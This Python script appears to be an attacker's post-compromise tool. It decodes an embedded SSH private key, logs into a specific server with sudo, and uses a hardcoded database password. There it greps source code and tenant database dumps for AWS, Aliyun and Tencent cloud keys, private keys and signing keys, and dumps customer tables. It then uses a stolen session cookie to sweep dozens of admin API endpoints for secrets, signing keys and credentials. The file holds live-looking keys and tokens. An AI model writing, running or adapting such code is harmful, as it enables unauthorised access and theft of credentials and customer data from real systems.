# -*- coding: utf-8 -*-
# intent 29581 round F: prove/disprove provisioning cloud creds; enterprise_profiles; grep all tenant DB dumps; enumerate /v1/ops GETs.
import os,sys,base64,subprocess,json,re,time,urllib.request,urllib.error
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"; TOKEN="D-hUbeTWwdwMtalSAtr7y9giyDqBGX43lu8nDOIQPEY"
open("/tmp/fk","wb").write(base64.b64decode(KEYB64)); os.chmod("/tmp/fk",0o600)
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
def R(k,v,maxb=80000):
    try: s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def http(path,timeout=40,maxlen=1300):
    req=urllib.request.Request("https://cloud-admin.lumiiai.cn"+path,method="GET")
    req.add_header("User-Agent",UA); req.add_header("Accept","application/json"); req.add_header("Cookie","lumii_ops_session="+TOKEN)
    try:
        r=urllib.request.urlopen(req,timeout=timeout); return {"code":r.getcode(),"body":r.read().decode("utf-8","replace")[:maxlen]}
    except urllib.error.HTTPError as e: return {"code":e.code,"body":e.read().decode("utf-8","replace")[:600]}
    except Exception as e: return {"code":-1,"body":repr(e)}
SCRIPT = r"""
set +e
export PGPASSWORD='b24ebdd91c1c1d160992ce8b77d838a68b2647a9612d7c6f'
PSQL="psql -h 127.0.0.1 -U lumii_cloud -d lumii_cloud -P pager=off -At"
echo "@@@GREPPROV"; grep -rniE 'AWS_ACCESS|AWS_SECRET|ALIYUN|aliyun|AccessKey|SecretId|cloud.?provider|provisioning.?cred|CAM_|TencentCloud' /data/lumii-shared/app/src /data/lumii-shared/app/apps 2>/dev/null | grep -viE 'node_modules|\.map' | head -40
echo "@@@GREPSIGN"; grep -rniE 'CLOUD_SIGNING|SIGNING_KEY|signingKey|release.{0,10}sign|\.sig|ed25519' /data/lumii-shared/app/src 2>/dev/null | grep -viE 'node_modules|\.map' | head -40
echo "@@@ROUTES"; grep -rhoE 'app\.(get|post|patch|put|delete)\("[^"]+"' /data/lumii-shared/app/src/cloud 2>/dev/null | sed 's/app\.//' | sort -u | head -260
echo "@@@EPROFCOLS"; $PSQL -At -c "select column_name||'|'||data_type from information_schema.columns where table_name='enterprise_profiles' order by ordinal_position"
echo "@@@EPROF"; $PSQL -F'|' -c "select * from enterprise_profiles"
echo "@@@PROVJOBSCOLS"; $PSQL -At -c "select table_name from information_schema.tables where table_name ~* 'provision|cloud|sign|secret' order by 1"
echo "@@@PROVJOBS"; $PSQL -F'|' -c "select * from provision_jobs order by 1 desc limit 8" 2>&1 | head -12
echo "@@@DUMPGREP_CLOUDCREDS"; grep -aoE '.{0,40}(AKID[A-Za-z0-9]{16,}|LTAI[A-Za-z0-9]{12,}|AKIA[A-Z0-9]{12,}|-----BEGIN [A-Z ]+PRIVATE KEY|accessKey|access_key|secretKey|secret_key).{0,50}' /tmp/d_*.sql 2>/dev/null | sort -u | head -40
echo "@@@UPDATES"; ls -la /data/lumii-shared/registry/updates | tail -12; echo "--latest.json--"; cat /data/lumii-shared/registry/updates/latest.json 2>/dev/null; echo; echo "--win--"; cat /data/lumii-shared/registry/updates/latest-win.json 2>/dev/null; echo; echo "--changelog head--"; head -c 300 /data/lumii-shared/registry/updates/desktop-changelog.json 2>/dev/null
echo "@@@MARKETDIR"; ls /data/lumii-shared/registry/market 2>/dev/null | head -20
echo "@@@DONE"
"""
def run(cmd,timeout=560):
    try:
        p=subprocess.run(cmd,input=SCRIPT.encode(),capture_output=True,timeout=timeout); return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
a=["ssh","-i","/tmp/fk","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=15","-o","IdentitiesOnly=yes","ubuntu@43.143.107.214","sudo -n bash -s"]
rc,o,e=run(a,timeout=580)
R("meta",{"rc":rc,"err":e[-300:],"outlen":len(o)})
parts=re.split(r'@@@([A-Z0-9_]+)',o)
for i in range(1,len(parts),2):
    R(parts[i].lower(), parts[i+1] if i+1<len(parts) else "")
EPS=["/v1/ops/me","/v1/ops/admins","/v1/ops/service-credentials","/v1/ops/platform-events","/v1/ops/provision-jobs","/v1/ops/provision-jobs/summary","/v1/ops/registry/enterprises","/v1/ops/registry/secret-pickups","/v1/ops/registry/market/pending","/v1/ops/registry/market/unowned","/v1/ops/registry/market/listed","/v1/ops/registry/market/scenes","/v1/ops/registry/changelog/stable","/v1/ops/registry/changelog/desktop","/v1/ops/plans","/v1/ops/orders","/v1/ops/customers","/v1/ops/subscriptions","/v1/ops/workspaces","/v1/ops/instances","/v1/ops/cloud-environments","/v1/ops/cloud-environment-config","/v1/ops/signing-keys","/v1/ops/signing","/v1/ops/secrets","/v1/ops/market-images","/v1/ops/registry/images","/v1/ops/models","/v1/ops/alerts","/v1/ops/audit","/v1/ops/approvals","/v1/ops/usage","/v1/ops/tenants","/v1/ops/users","/v1/entry-environments","/v1/health"]
res={}
for p in EPS:
    res[p]=http(p)
R("api_all",res,maxb=90000)
R("done",{"t":int(time.time())})
